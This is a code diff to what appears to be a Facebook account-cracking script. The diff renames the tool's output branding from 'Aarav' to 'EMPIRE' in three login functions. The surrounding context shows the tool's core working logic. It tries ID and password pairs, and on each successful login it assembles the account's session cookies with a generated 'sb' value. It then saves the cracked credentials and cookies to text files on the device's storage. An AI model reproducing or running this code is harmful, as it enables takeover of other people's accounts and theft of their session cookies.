@@ -126,9 +126,9 @@ def api1(ids,names,passlist):
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={ssbb};{ckkk}"
-                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mAarav\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
+                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mEMPIRE\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                     #line()
-                    file_path = os.path.join(folder_path, 'Aarav-FILE-OK.txt')
+                    file_path = os.path.join(folder_path, 'EMPIRE-FILE-OK.txt')
                     open('/sdcard/EMPIER/EMPIRE-FILE-OK-COOKIE-M1.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+'|'+pas+'\n')
@@ -209,9 +209,9 @@ def api2(ids,names,passlist):
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={ssbb};{ckkk}"
-                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mAarav\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
+                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mEMPIRE\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                     #line()
-                    file_path = os.path.join(folder_path, 'Aarav-FILE-OK.txt')
+                    file_path = os.path.join(folder_path, 'EMPIRE-FILE-OK.txt')
                     open('/sdcard/EMPIER/EMPIRE-FILE-OK-COOKIE-M2.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+'|'+pas+'\n')
@@ -291,10 +291,10 @@ def api3(ids,names,passlist):
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                     ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                     cookie = f"sb={ssbb};{ckkk}"
-                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mAarav\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
+                    print('\r\r\x1b[38;5;196m[\x1b[38;5;46mEMPIRE\x1b[1;97m-\x1b[38;5;46m💚\x1b[38;5;196m]\x1b[38;5;46m '+uid+'|'+pas)
                     #line()
-                    file_path = os.path.join(folder_path, 'Aarav-FILE-OK.txt')
-                    open('/sdcard/EMPIRE/Aarav-FILE-OK-COOKIE-M3.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
+                    file_path = os.path.join(folder_path, 'EMPIRE-FILE-OK.txt')
+                    open('/sdcard/EMPIRE/EMPIRE-FILE-OK-COOKIE-M3.txt','a').write(uid+'|'+pas+' >>> '+cookie+'\n')
                     with open(file_path, 'a') as file:
                         file.write(uid+'|'+pas+'\n')
                     oks.append(uid)
